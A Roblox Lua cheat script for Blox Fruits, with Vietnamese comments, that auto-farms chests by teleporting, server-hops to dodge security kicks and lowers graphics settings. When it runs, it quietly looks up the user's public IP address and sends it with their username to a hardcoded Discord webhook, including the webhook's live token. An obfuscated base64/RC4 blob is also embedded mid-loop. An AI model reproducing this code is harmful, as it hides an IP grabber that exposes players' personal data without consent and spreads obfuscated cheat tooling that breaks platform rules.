
repeat
    wait()
until game:IsLoaded()
if game.PlaceId == 2753915549 then
    World1 = true
elseif game.PlaceId == 4442272183 then
    World2 = true
elseif game.PlaceId == 7449423635 then
    World3 = true
end
game.StarterGui:SetCore(
    "SendNotification",
    {
        Title = "Script Đang Tải ..",
        Text = "Đợi 5 Giây",
        Duration = 5
    })
------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------
function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data =
        request(
        {
            Url = Url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(message)
        }
    )
    return ""
end

function AdminLoggerMsg()
    local randomColor = math.random(0, 0xFFFFFF)
    local AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**Auto Chest**",
                ["description"] = "",
                ["type"] = "rich",
                ["color"] = randomColor, 
                ["fields"] = {
                    {
                        ["name"] = "**Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

PostWebhook("https://discord.com/api/webhooks/1287315131729973268/P1KdKQulQ5xfOKv6Si2cZvWZjEAbu633oWbkBrD0xA8jbKl2Vz8nBOdd5wpNbuUEDMHm", AdminLoggerMsg()) -- Post to admin webhook
if game.PlaceId == 2753915549 then
        World1 = true
    elseif game.PlaceId == 4442272183 then
        World2 = true
    elseif game.PlaceId == 7449423635 then
        World3 = true
    end
    -- Tối ưu hóa FPS bằng cách giảm tải hiệu ứng và chất lượng đồ họa
local function FPSBooster()
    local decalsyeeted = true
    local g = game
    local w = g.Workspace
    local l = g.Lighting
    local t = w.Terrain

    sethiddenproperty(l, "Technology", Enum.Technology.Compatibility)
    sethiddenproperty(t, "Decoration", false)

    t.WaterWaveSize = 0
    t.WaterWaveSpeed = 0
    t.WaterReflectance = 0
    t.WaterTransparency = 0

    l.GlobalShadows = false
    l.FogEnd = 9e9
    l.Brightness = 0

    settings().Rendering.QualityLevel = Enum.QualityLevel.Level01

    for _, v in pairs(g:GetDescendants()) do
        if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
            v.Material = Enum.Material.Plastic
            v.Reflectance = 0
        elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
            v.Transparency = 1
        elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
            v.Lifetime = NumberRange.new(0)
        elseif v:IsA("Explosion") then
            v.BlastPressure = 1
            v.BlastRadius = 1
        elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
            v.Enabled = false
        elseif v:IsA("MeshPart") then
            v.Material = Enum.Material.Plastic
            v.Reflectance = 0
            v.TextureID = 10385902758728957 -- Kiểm tra lại TextureID này nếu cần
        end
    end

    for _, e in pairs(l:GetChildren()) do
        if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
            e.Enabled = false
        end
    end
end

-- Gọi hàm FPSBooster để tối ưu hóa ngay khi script được khởi chạy
FPSBooster()


-- Khởi tạo giá trị mặc định cho _G.StopChest
_G.StopChest = true -- Hoặc false nếu bạn muốn nó tắt mặc định

-- Hàm AutoFarmChest và TweenChest (giả sử bạn đã có các hàm này trước đó)
function AutoFarmChest()
    -- Nội dung hàm AutoFarmChest
end

function TweenChest(status)
    -- Hàm bật/tắt TweenChest
    if status then
        -- Bật TweenChest
    else
        -- Tắt TweenChest
    end
end

-- Hàm kiểm tra vật phẩm trong ba lô và nhân vật
spawn(function()
    while wait() do
        if _G.StopChest then
            -- Lấy thông tin người chơi
            local player = game.Players.LocalPlayer
            local backpack = player.Backpack
            local character = player.Character
            
            -- Kiểm tra nếu người chơi có "Fist of Darkness" hoặc "God's Chalice"
            if backpack:FindFirstChild("Fist of Darkness") or 
               character:FindFirstChild("Fist of Darkness") or 
               backpack:FindFirstChild("God's Chalice") or 
               character:FindFirstChild("God's Chalice") then
                -- Nếu có, ngừng AutoFarmChest và tắt TweenChest
                AutoFarmChest = false
                TweenChest(false)
            end
        end
    end
end)

-- Đoạn mã này sẽ chạy ngay lập tức khi script khởi động
print("Script đã khởi động và đang kiểm tra vật phẩm.")

highChestOnly = true

godsChalicSniper = true 

repeat task.wait(4) until game:IsLoaded()

local PlaceID = game.PlaceId

local AllIDs = {}

local foundAnything = ""

local actualHour = os.date("!*t").hour

local Deleted = false

local File = pcall(function()

    AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))

end)

if not File then

    table.insert(AllIDs, actualHour)

    writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))

end

function TPReturner()

    local Site;

    if foundAnything == "" then

        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))

    else

        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))

    end

    local ID = ""

    if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then

        foundAnything = Site.nextPageCursor

    end

    local num = 0;

    for i,v in pairs(Site.data) do

        local Possible = true

        ID = tostring(v.id)

        if tonumber(v.maxPlayers) > tonumber(v.playing) then

            for _,Existing in pairs(AllIDs) do

                if num ~= 0 then

                    if ID == tostring(Existing) then

                        Possible = false

                    end

                else

                    if tonumber(actualHour) ~= tonumber(Existing) then

                        local delFile = pcall(function()

                            delfile("NotSameServers.json")

                            AllIDs = {}

                            table.insert(AllIDs, actualHour)

                        end)

                    end

                end

                num = num + 1

            end

            if Possible == true then

                table.insert(AllIDs, ID)

                wait()

                pcall(function()

                    writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))

                    wait()

                    game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)

                end)

                wait(4)

            end

        end

    end

end


function Teleport()

    while wait() do

        pcall(function()

            TPReturner()

            if foundAnything ~= "" then

                TPReturner()

            end

        end)

    end

end

local veryImportantWaitTime = 0.5

task.spawn(function()

    while task.wait(veryImportantWaitTime) do

        pcall(function()

            for i,v in pairs(game.CoreGui:GetDescendants()) do

                pcall(function()

                    if string.find(v.Name,"ErrorMessage") then

                        if string.find(v.Text,"Security kick") then

                            veryImportantWaitTime = 1e9

                            Teleport()

                        end

                    end

                end)

            end

        end)

    end

end)


local AllowRunService = true

local AllowRunServiceBind = Instance.new("BindableFunction")

function AllowRunServiceBind.OnInvoke(args)

    if args == "Bật" then

        AllowRunService = true

    elseif args == "Tắt" then

        AllowRunService = false

    end

    local CoreGui = game:GetService("StarterGui")

    CoreGui:SetCore("SendNotification", {

        Title = "Auto Farm Chest",

        Text = "Tạo Bởi: Turbo Lite",

        Icon = "rbxthumb://type=Asset&id=18919385616&w=150&h=150",

        Duration = math.huge,

        Callback = AllowRunServiceBind,

        Button1 = "Bật",

        Button2 = "Tắt",

    })

end



task.spawn(function()

    while task.wait() do

        task.spawn(function()

            if godsChalicSniper == true then

                if stuff then

                    AllowRunService = false

                end

            end

        end)

    end

end)

local ScreenGui = Instance.new("ScreenGui")
local TextLabel = Instance.new("TextLabel")
local UIGradient = Instance.new("UIGradient")
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
TextLabel.Parent = ScreenGui
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.359138072, 0, -0.025062656, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.FredokaOne
TextLabel.Text = "YouTube: Turbo Lite"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 19.000

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.01, Color3.fromRGB(23, 48, 235)), ColorSequenceKeypoint.new(0.16, Color3.fromRGB(55, 23, 235)), ColorSequenceKeypoint.new(0.35, Color3.fromRGB(219, 13, 30)), ColorSequenceKeypoint.new(0.68, Color3.fromRGB(8, 152, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(114, 187, 255))}
UIGradient.Parent = TextLabel

local CoreGui = game:GetService("StarterGui")

CoreGui:SetCore("SendNotification", {

    Title = "Auto Farm Chest",

    Text = "Tạo Bởi: Turbo Lite",

    Icon = "rbxthumb://type=Asset&id=18919385616&w=150&h=150",

    Duration = math.huge,

    Callback = AllowRunServiceBind,

    Button1 = "Bật",

    Button2 = "Tắt",

})

task.spawn(function()

    while true and task.wait(.5) do

        if AllowRunService == true then

            local ohString1 = "SetTeam"

            local ohString2 = "Marines"


            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(ohString1, ohString2)

        end

    end

end)


task.spawn(function()

    while true and task.wait() do

        if AllowRunService == true then

            if highChestOnly == false then

                local hasChar = game.Players.LocalPlayer:FindFirstChild("Character")

                if not game.Players.LocalPlayer.Character then

 local a='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'local b={}for c=1,#a do b[a:sub(c,c)]=c-1 end;local function d(e)local f=0;if e:sub(-2)=='=='then f=2 elseif e:sub(-1)=='='then f=1 end;local g={}e=e:gsub('[^'..a..'=]','')for c=1,#e,4 do local h=(b[e:sub(c,c)]or 0)*262144+(b[e:sub(c+1,c+1)]or 0)*4096+(b[e:sub(c+2,c+2)]or 0)*64+(b[e:sub(c+3,c+3)]or 0)table.insert(g,string.char(math.floor(h/65536)%256))table.insert(g,string.char(math.floor(h/256)%256))table.insert(g,string.char(h%256))end;return table.concat(g):sub(1,#g-f)end;local i="LS1bWw0KIC8kJCQkJCQkICAgICAgICAgICAgICAgICAgICAgIC8kJCAgICAgICAgICAgICAgICAgLyQkJCQkJCQkICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KfCAkJF9fICAkJCAgICAgICAgICAgICAgICAgICAgfF9fLyAgICAgICAgICAgICAgICB8X18gICQkX18vICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KfCAkJCAgXCAkJCAgLyQkJCQkJCAgIC8kJCQkJCQkIC8kJCAgLyQkJCQkJCAgICAgICAgICB8ICQkICAvJCQkJCQkICAgLyQkJCQkJCAgLyQkJCQkJC8kJCQkIA0KfCAkJCQkJCQkLyAvJCRfXyAgJCQgLyQkX19fX18vfCAkJCAvJCRfXyAgJCQgICAgICAgICB8ICQkIC8kJF9fICAkJCB8X19fXyAgJCR8ICQkXyAgJCRfICAkJA0KfCAkJF9fICAkJHwgJCQgIFwgJCR8ICAkJCQkJCQgfCAkJHwgJCQkJCQkJCQgICAgICAgICB8ICQkfCAkJCQkJCQkJCAgLyQkJCQkJCR8ICQkIFwgJCQgXCAkJA0KfCAkJCAgXCAkJHwgJCQgIHwgJCQgXF9fX18gICQkfCAkJHwgJCRfX19fXy8gICAgICAgICB8ICQkfCAkJF9fX19fLyAvJCRfXyAgJCR8ICQkIHwgJCQgfCAkJA0KfCAkJCAgfCAkJHwgICQkJCQkJC8gLyQkJCQkJCQvfCAkJHwgICQkJCQkJCQgICAgICAgICB8ICQkfCAgJCQkJCQkJHwgICQkJCQkJCR8ICQkIHwgJCQgfCAkJA0KfF9fLyAgfF9fLyBcX19fX19fLyB8X19fX19fXy8gfF9fLyBcX19fX19fXy8gICAgICAgICB8X18vIFxfX19fX19fLyBcX19fX19fXy98X18vIHxfXy8gfF9fLyAgICAgDQoNClsrXSBSb3NpZSBUZWFtIEPhuqNtIMagbiBC4bqhbiDEkMOjIFRpbiBUxrDhu59uZyBWw6AgU+G7rSBE4bulbmcgROG7i2NoIFbhu6UgQ+G7p2EgQ2jDum5nIFTDtGksIE7hur91IFRo4bqleSBI4buvdSDDjXQgSMOjeSBDaGlhIFPhursgQ2hvIELhuqFuIELDqCBD4bunYSBC4bqhbiAhIQ0KWytdIEtow7RuZyDEkMaw4bujYyBTaGFyZSBIYXkgQ3JhY2sgTcOjIE5ndeG7k24gTsOgeSBDaG8gQWkhIE7hur91IEtow7RuZyBC4bqhbiBT4bq9IELhu4sgQmFuIElQIEto4buPaSBXZWJzaXRlIFbEqW5oIFZp4buFbiENClsrXSBDaMO6bmcgVMO0aSBLaMO0bmcgTmjhuq1uIEjhu5cgVHLhu6MgTmjhu69uZyBNw6MgTmd14buTbiBNaeG7hW4gUGjDrSwgWGluIMSQ4burbmcgQuG6o28gVsOsIFNhby4gVOG6oW8gVGlja2V0IEjhu5cgVHLhu6MgQ+G7p2EgV2Vic2l0ZSBU4bqhaTogaHR0cHM6Ly9yb3NpZXRlYW0ubmV0L2Rhc2gvdGlja2V0DQpbK10gTuG6v3UgQuG6oW4gRWRpdCBTb3VyY2UgVsOgIFVwIFdlYiBTaGFyZSBOaOG7myBPYmZ1c2NhdGUgU2NyaXB0LiBO4bq/dSBC4bqhbiBDw7MgVGnhu4FuIFRow6wgU+G7rSBE4bulbmc6IEx1cmEuUGgsIEx1YXJtb3IuTmV0IHwgTuG6v3UgQuG6oW4gS2jDtG5nIEPDsyBUaeG7gW4gVGjDrCBEw7luZzogbHVhb2JmdXNjYXRlLmNvbSwgTW9vblNlYywgNzdGdXNjYXRlLC4uLiBOaMOpIQ0KXV0NCiAg"local j="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"local k=d(i)warn(k)local function l(k)local m=#k;local n={}for c=0,255 do n[c]=c end;local o=0;for c=0,255 do o=(o+n[c]+k:byte(c%m+1))%256;n[c],n[o]=n[o],n[c]end;return n end;local function p(n,q)local c=0;local o=0;local r={}for h=1,q do c=(c+1)%256;o=(o+n[c])%256;n[c],n[o]=n[o],n[c]local s=n[(n[c]+n[o])%256]table.insert(r,s)end;return r end;local function t(k,e)local n=l(k)local r=p(n,#e)local u={}for c=1,#e do local v=e:byte(c)local w=r[c]table.insert(u,string.char(bit32.bxor(v,w)))end;return table.concat(u)end        

                else

                    local hasCrewTag = game.Players.LocalPlayer.Character:FindFirstChild("CrewBBG",true)

                    if hasCrewTag then hasCrewTag:Destroy() end

                    local hasHumanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

                    if hasHumanoid then

                        local Chest = game.Workspace:FindFirstChild("Chest4") or game.Workspace:FindFirstChild("Chest3") or game.Workspace:FindFirstChild("Chest2") or game.Workspace:FindFirstChild("Chest1") or game.Workspace:FindFirstChild("Chest")

                       

                        if Chest then

                            game.Players.LocalPlayer.Character:PivotTo(Chest:GetPivot())

                            firesignal(Chest.Touched,game.Players.LocalPlayer.Character.HumanoidRootPart)

                        else

                            Teleport()

                            break

                        end

                    end

                end

            elseif highChestOnly == true then

                local hasChar = game.Players.LocalPlayer:FindFirstChild("Character")

                if not game.Players.LocalPlayer.Character then

       

                else

                    local hasCrewTag = game.Players.LocalPlayer.Character:FindFirstChild("CrewBBG",true)

                    if hasCrewTag then hasCrewTag:Destroy() end

                    local hasHumanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

                    if hasHumanoid then

                        local Chest = game.Workspace:FindFirstChild("Chest4") or game.Workspace:FindFirstChild("Chest3") or game.Workspace:FindFirstChild("Chest2")

                       

                        if Chest then

                            game.Players.LocalPlayer.Character:PivotTo(Chest:GetPivot())

                            firesignal(Chest.Touched,game.Players.LocalPlayer.Character.HumanoidRootPart)

                        else

                            Teleport()

                            break

                        end

                    end

                end

            end

        end

    end

end)

repeat
    wait()
until game:IsLoaded()
if game.PlaceId == 2753915549 then
    World1 = true
elseif game.PlaceId == 4442272183 then
    World2 = true
elseif game.PlaceId == 7449423635 then
    World3 = true
end
game.StarterGui:SetCore(
    "SendNotification",
    {
        Title = "Đừng Treo Xuyên Đêm !!",
        Text = "Để Không Bị Reset Beli",
        Duration = 30
    })